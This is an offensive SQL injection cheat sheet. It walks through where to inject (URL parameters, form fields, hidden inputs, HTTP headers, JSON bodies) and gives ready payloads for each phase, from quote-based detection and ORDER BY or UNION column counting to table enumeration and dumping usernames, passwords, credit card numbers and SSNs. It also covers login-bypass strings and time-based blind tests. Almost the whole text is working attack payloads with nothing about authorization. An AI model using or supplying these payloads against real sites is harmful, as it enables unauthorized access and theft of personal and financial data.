# WHEN & WHERE TO USE SQL INJECTION COMMANDS

## WHERE TO INJECT (The Entry Points)

### 1. URL Parameters
```
https://site.com/products?id=5
                 ↑ inject here

https://site.com/category?name=Gifts
                         ↑ inject here

https://site.com/search?q=laptop
                      ↑ inject here
```

### 2. Form Fields
```
Username: [ admin'-- ]  ← inject here
Password: [ anything ]  
Login Button

Search: [ ' OR 1=1-- ]  ← inject here
```

### 3. Hidden Inputs (Inspect HTML)
```html
<input type="hidden" name="userid" value="123">
                                 ↑ inject by changing value
```

### 4. HTTP Headers (Use Burp Suite)
```
User-Agent: Mozilla/5.0'--
Referer: https://site.com'--
Cookie: sessionid=abc123'--
X-Forwarded-For: 127.0.0.1'--
```

### 5. JSON/API Data
```json
{"username": "admin'--", "password": "anything"}
                 ↑ inject here
```

---

## WHEN TO USE EACH COMMAND

### PHASE 1: DETECTION (Is it vulnerable?)

**Use this FIRST on every parameter:**

| Command | When to Use | What Happens |
|---------|-------------|--------------|
| `'` | **ALWAYS FIRST** | If error appears → VULNERABLE |
| `"` | If `'` gives no error | Try different quote |
| `'--` | After single quote test | If error disappears → VULNERABLE |
| `' OR '1'='1` | After basic tests | If more results appear → VULNERABLE |

**Example:**
```
https://site.com/products?id=5'
```
- See error? → Good, vulnerable
- No error? → Try `5'--`

---

### PHASE 2: MAP THE DATABASE (How many columns?)

| Command | When to Use | What It Does |
|---------|-------------|--------------|
| `' ORDER BY 1--` | After confirming vulnerability | Tests if 1 column exists |
| `' ORDER BY 2--` | If 1 worked | Tests if 2 columns exist |
| `' ORDER BY 3--` | If 2 worked | Tests if 3 columns exist |
| `' ORDER BY 100--` | Until error appears | Finds max columns |

**Stop when you get error.** Last working number = column count.

**Alternative:**
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
Add NULLs until no error. That's your column count.

---

### PHASE 3: FIND OUTPUT LOCATION (Where can I see data?)

| Command | When to Use | What to Look For |
|---------|-------------|------------------|
| `' UNION SELECT 1,2,3--` | After knowing column count | Numbers appear on page? |

**Example:** If page shows `2` and `3`, those columns are visible. Use them to extract data.

---

### PHASE 4: EXTRACT DATABASE INFO

| Command | When to Use | What It Does |
|---------|-------------|--------------|
| `' UNION SELECT @@version,2,3--` | MySQL suspected | Shows database version |
| `' UNION SELECT version(),2,3--` | PostgreSQL suspected | Shows version |
| `' UNION SELECT banner,2,3 FROM v$version--` | Oracle suspected | Shows version |
| `' UNION SELECT database(),2,3--` | MySQL | Shows current DB name |
| `' UNION SELECT user(),2,3--` | MySQL | Shows current user |

---

### PHASE 5: FIND TABLES

| Command | When to Use | What It Does |
|---------|-------------|--------------|
| `' UNION SELECT table_name,2,3 FROM information_schema.tables--` | MySQL | Lists ALL tables |
| `' UNION SELECT name,2,3 FROM sys.tables--` | MSSQL | Lists ALL tables |
| `' UNION SELECT table_name,2,3 FROM all_tables--` | Oracle | Lists ALL tables |

**Look for:** `users`, `admins`, `customers`, `accounts`, `login`

---

### PHASE 6: FIND COLUMNS IN INTERESTING TABLE

| Command | When to Use | What It Does |
|---------|-------------|--------------|
| `' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--` | MySQL | Shows columns in users table |

**Look for:** `username`, `password`, `email`, `credit_card`, `ssn`

---

### PHASE 7: DUMP THE DATA (THE PAYDAY)

| Command | When to Use | What It Does |
|---------|-------------|--------------|
| `' UNION SELECT username,password,3 FROM users--` | 3 columns, 2 visible | Shows usernames and passwords |
| `' UNION SELECT concat(username,':',password),2,3 FROM users--` | Only 1 visible column | Combines data into one field |
| `' UNION SELECT group_concat(username,':',password),2,3 FROM users--` | MySQL | All users in one row |

---

## REAL-WORLD SCENARIOS

### SCENARIO 1: Login Page
**Where:** Username field
**When:** First time visiting site

```
Username: admin'--
Password: anything
```
**Why:** Bypasses password check completely

If that fails:
```
Username: ' OR 1=1--
Password: anything
```

---

### SCENARIO 2: Product Listing Page
**Where:** Category parameter
**When:** You see products filtered by category

```
https://shop.com/products?category=Gifts' OR 1=1--
```
**Why:** Shows ALL products (including hidden/unreleased)

---

### SCENARIO 3: Search Box
**Where:** Search field
**When:** Site has search functionality

```
Search: ' UNION SELECT username,password FROM users--
```
**Why:** Search results might show database content

---

### SCENARIO 4: User Profile Page
**Where:** ID parameter
**When:** URL shows user ID like `?id=5`

```
https://site.com/profile?id=5' AND 1=1--
```
If page loads normally, then try:
```
https://site.com/profile?id=5' AND 1=2--
```
If page loads differently → BLIND SQL INJECTION

Then use time-based:
```
https://site.com/profile?id=5' AND SLEEP(5)--
```
If page takes 5 seconds → Confirmed blind SQLi

---

### SCENARIO 5: When Nothing Shows on Page
**Where:** Any parameter
**When:** No errors, no data visible

Use time-based:
```
' AND SLEEP(5)--
```
If response takes 5+ seconds → VULNERABLE (blind)

---

## QUICK DECISION TREE

```
Found input field? (URL, form, header)
        |
        v
Try: ' 
        |
        +--> Error? --> VULNERABLE! Go to PHASE 2
        |
        +--> No error?
              |
              v
        Try: ' OR 1=1--
              |
              +--> More results? --> VULNERABLE! Go to PHASE 2
              |
              +--> No change?
                    |
                    v
              Try: ' AND SLEEP(5)--
                    |
                    +--> 5 sec delay? --> BLIND VULNERABLE
                    |
                    +--> No delay? --> Probably NOT vulnerable
```

---

## COMMAND QUICK REFERENCE BY SITUATION

| Situation | Command to Use |
|-----------|----------------|
| First test on any parameter | `'` |
| Login page | `admin'--` or `' OR 1=1--` |
| Want to see hidden items | `' OR 1=1--` |
| Need column count | `' ORDER BY 1--` (increase until error) |
| Know column count | `' UNION SELECT 1,2,3--` |
| Want database version | `' UNION SELECT @@version,2,3--` |
| Want table list | `' UNION SELECT table_name FROM information_schema.tables--` |
| Want passwords | `' UNION SELECT password FROM users--` |
| Nothing visible on page | `' AND SLEEP(5)--` |
| Error shows but no data | `' AND 1=convert(int, @@version)--` |

---

## GOLDEN RULE

**Start simple, then escalate:**

1. First try: `'`
2. Second try: `' OR 1=1--`
3. Third try: `' UNION SELECT NULL--`
4. Fourth try: Time-based if nothing works

If none of these work, parameter is probably safe. Move to next input field!